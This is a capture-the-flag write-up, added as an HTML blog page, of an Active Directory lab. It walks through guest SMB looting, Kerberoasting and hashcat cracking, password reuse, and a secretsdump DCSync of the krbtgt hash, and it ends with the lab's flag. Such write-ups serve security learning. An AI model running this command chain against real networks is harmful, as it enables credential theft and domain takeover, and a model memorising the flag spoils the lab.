@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MartiniAD — guest to krbtgt | Shashank Patil</title>
+<meta name="description" content="Black-box Active Directory on Hack Smarter: anonymous guest SMB to a cleartext credential, Kerberoasting, password reuse onto a tier-0 admin, and a DCSync of the krbtgt hash.">
+
+<style>
+
+body{
+background:black;
+color:#00ff9c;
+font-family:monospace;
+margin:0;
+padding:0;
+}
+
+nav{
+padding:15px;
+border-bottom:1px solid #00ff9c;
+}
+
+nav a{
+color:#00ff9c;
+margin-right:20px;
+text-decoration:none;
+}
+
+nav a:hover{
+text-decoration:underline;
+}
+
+main{
+max-width:800px;
+margin:0 auto;
+padding:40px 20px 80px 20px;
+line-height:1.75;
+font-size:15px;
+}
+
+h1{
+line-height:1.3;
+}
+
+h2{
+margin-top:55px;
+border-bottom:1px solid #00ff9c;
+padding-bottom:8px;
+}
+
+h3{
+margin-top:35px;
+}
+
+a{
+color:#00ff9c;
+}
+
+.meta{
+opacity:0.65;
+font-size:13px;
+margin-bottom:40px;
+}
+
+code{
+background:#062;
+color:#c9ffe8;
+padding:1px 5px;
+}
+
+pre{
+border:1px solid #00ff9c;
+padding:15px;
+overflow-x:auto;
+font-size:13px;
+line-height:1.5;
+}
+
+pre code{
+background:none;
+color:#00ff9c;
+padding:0;
+}
+
+blockquote{
+border-left:3px solid #00ff9c;
+margin:30px 0;
+padding:5px 0 5px 20px;
+opacity:0.9;
+}
+
+ul{
+padding-left:20px;
+}
+
+li{
+margin-bottom:8px;
+}
+
+footer{
+border-top:1px solid #00ff9c;
+margin-top:60px;
+padding-top:20px;
+font-size:13px;
+opacity:0.8;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<nav>
+<a href="../index.html">Home</a>
+<a href="../blog.html">Blog</a>
+<a href="https://github.com/b17w1z4rd">GitHub</a>
+</nav>
+
+<main>
+
+<h1>$ cat martiniad.md</h1>
+
+<p class="meta">
+Hack Smarter &middot; Easy &middot; Active Directory
+</p>
+
+<p>
+A textbook easy-AD chain, black-box from a VPN with no credentials: anonymous guest SMB -> cleartext creds in a readable share -> Kerberoast -> crack a service account -> password reuse onto a tier-0 admin -> DCSync the <code>krbtgt</code> hash. The objective is the KRBTGT NT hash, which only falls out of DCSync once you control a principal with replication rights &mdash; so the real work is the foothold-to-DA path; the hash is one command at the end.
+</p>
+
+<p>
+<em>Scenario: “Martini Bars”, an adult-beverage company, wants an internal black-box pentest of a branch office. Domain <code>DRY.MARTINI.BARS</code>, DC <code>DC01</code>. Hack Smarter reissues the target IP on redeploy &mdash; substitute your own for 10.1.159.245 below.</em>
+</p>
+
+<h2>$ recon</h2>
+
+<pre><code>nmap -Pn -sCV -p- 10.1.159.245</code></pre>
+
+<p>
+The usual DC fingerprint comes back &mdash; <code>53, 88, 389, 445, 636, 3268, 5985</code> &mdash; on Windows Server 2025 (Build 26100). Port 88 confirms a KDC; 5985 (WinRM) is a likely shell later. Add the host to <code>/etc/hosts</code> now, because Kerberos needs name resolution and skipping this bites you two steps down:
+</p>
+
+<pre><code>echo &#x27;10.1.159.245  DC01.DRY.MARTINI.BARS DRY.MARTINI.BARS DC01&#x27; | sudo tee -a /etc/hosts</code></pre>
+
+<h2>$ foothold — guest to a readable share</h2>
+
+<p>
+Guest authenticates, and there's a non-default <code>notes</code> share:
+</p>
+
+<pre><code>nxc smb 10.1.159.245 -u guest -p &#x27;&#x27; --shares
+# notes    READ,WRITE
+# IPC$     READ</code></pre>
+
+<p>
+The <code>IPC$</code> read lets us enumerate users by RID:
+</p>
+
+<pre><code>nxc smb 10.1.159.245 -u guest -p &#x27;&#x27; --rid-brute
+# Administrator, Guest, krbtgt, DC01$, mprice, athena.t0, ATHENA_SVC</code></pre>
+
+<p>
+Note the pair already: <code>ATHENA_SVC</code> (a service account) and <code>athena.t0</code> (a “tier-0” / admin-looking account). That naming similarity is the escalation hint &mdash; hold onto it. Now loot the share:
+</p>
+
+<pre><code>impacket-smbclient guest:&#x27;&#x27;@10.1.159.245
+# shares  -&gt;  use notes  -&gt;  get notes.txt
+
+cat notes.txt
+# - Order more gin for lakeside
+# - Look for an engagement ring
+# creds
+# mprice:*martini*</code></pre>
+
+<p>
+A to-do list with a <code>creds</code> line at the bottom &mdash; mprice's password in cleartext. Verify it:
+</p>
+
+<pre><code>nxc smb 10.1.159.245 -u mprice -p &#x27;*martini*&#x27;
+# [+] DRY.MARTINI.BARS\mprice:*martini*</code></pre>
+
+<h2>$ kerberoasting — mprice to ATHENA_SVC</h2>
+
+<p>
+With any valid domain user we can request service tickets for SPN-bearing accounts and crack them offline:
+</p>
+
+<pre><code>nxc ldap 10.1.159.245 -u mprice -p &#x27;*martini*&#x27; --kerberoast kerberoastables.txt</code></pre>
+
+<p>
+This pulls an etype-23 TGS-REP for <code>ATHENA_SVC</code> (LDAP also reveals it sits in <em>Remote Management Users</em> and <em>Remote Desktop Users</em> &mdash; a WinRM shell, if you want one). Service accounts with human-set passwords crack fast:
+</p>
+
+<pre><code>hashcat -m 13100 -a 0 kerberoastables.txt /usr/share/wordlists/rockyou.txt
+# ...ATHENA_SVC... : 1dirtymartini      (cracked in ~2 seconds)</code></pre>
+
+<h2>$ escalation — password reuse</h2>
+
+<p>
+This is the whole escalation: <code>athena.t0</code> reuses <code>ATHENA_SVC</code>'s password.
+</p>
+
+<pre><code>nxc smb 10.1.159.245 -u athena.t0 -p &#x27;1dirtymartini&#x27;
+# [+] DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)</code></pre>
+
+<p>
+<code>(Pwn3d!)</code> = local admin on the DC. Game over for the domain.
+</p>
+
+<h2>$ objective — DCSync the krbtgt hash</h2>
+
+<p>
+With replication rights on the DC, pull the objective via DRSUAPI:
+</p>
+
+<pre><code>impacket-secretsdump &#x27;DRY.MARTINI.BARS/athena.t0:1dirtymartini@10.1.159.245&#x27; -just-dc-user krbtgt
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::</code></pre>
+
+<p>
+The fourth colon-field (after the <code>aad3b4...</code> LM placeholder) is the KRBTGT NT hash &mdash; the answer. secretsdump also grabs the AES256/AES128 Kerberos keys, which is what you'd forge a modern Golden Ticket with, since RC4/etype-23 is increasingly disabled.
+</p>
+
+<h2>$ flag</h2>
+
+<pre><code>22ebc290e67668629c8d0812662a9c51   # KRBTGT NT hash</code></pre>
+
+<h2>$ gotchas</h2>
+
+<ul>
+<li><strong>One lab VPN at a time.</strong> With several Hack Smarter tunnels connected at once, they came up on overlapping <code>10.200.0.0/16</code> ranges and the route to the target subnet got claimed by the <em>wrong</em> <code>tun</code> interface &mdash; traffic black-holed and every tool timed out silently. <code>sudo pkill openvpn</code>, reconnect only this lab, and confirm <code>ip route | grep 10.1</code> points at the single active tunnel.</li>
+<li><strong>/etc/hosts is mandatory for Kerberoasting.</strong> Without the realm -> IP mapping, the KDC lookup fails with <code>Name or service not known</code> on <code>:88</code> and no ticket is written (hashcat then reports “No hashes loaded”).</li>
+<li><strong>NetExec's SMB path is flaky on this box</strong> (<code>NetBIOSTimeout</code> after a successful auth). Auth still succeeds; the enumeration just drops. Kerberoasting runs over LDAP/88 and behaves fine.</li>
+<li><strong>pyOpenSSL vs cryptography mismatch</strong> broke <code>impacket-secretsdump</code> with <code>AttributeError: module 'lib' has no attribute 'GEN_EMAIL'</code>. Fix: <code>pip install --break-system-packages --upgrade pyopenssl cryptography</code>.</li>
+</ul>
+
+<h2>$ takeaway</h2>
+
+<p>
+Nothing here is exotic &mdash; it's the bread and butter of easy AD: guest access is real access, cleartext secrets live in file shares, service-account passwords are crackable, and <strong>password reuse across a service account and its matching admin</strong> is the shortest path to Domain Admin. The naming convention told the whole story before the first ticket was ever requested.
+</p>
+
+<footer>
+<p>
+CTF handle <code>b17w1z4rd</code> &middot; <a href="https://github.com/b17w1z4rd">github.com/b17w1z4rd</a>
+</p>
+<p>
+<a href="../blog.html">&larr; back to all posts</a>
+</p>
+</footer>
+
+</main>
+
+</body>
+</html>
